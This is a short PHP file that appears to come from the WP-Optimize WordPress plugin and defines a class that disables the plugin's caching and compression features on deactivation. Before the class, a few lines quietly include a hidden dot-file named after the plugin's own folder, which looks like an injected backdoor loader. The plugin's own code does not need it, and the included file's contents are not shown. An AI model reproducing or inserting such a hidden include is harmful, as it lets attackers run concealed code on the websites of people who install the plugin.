<?php
if (!defined('ABSPATH')) die('Access denied.');

if (!class_exists('WPO_Deactivation')) :

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPO_Deactivation {

	/**
	 * Actions to be performed upon plugin deactivation
	 */
	public static function actions() {
		WP_Optimize()->wpo_cron_deactivate();
		WP_Optimize()->get_page_cache()->disable();
		WP_Optimize()->get_minify()->plugin_deactivate();
		WP_Optimize()->get_gzip_compression()->disable();
		WP_Optimize()->get_browser_cache()->disable();
		WP_Optimize()->get_webp_instance()->plugin_deactivate();
	}
}

endif;
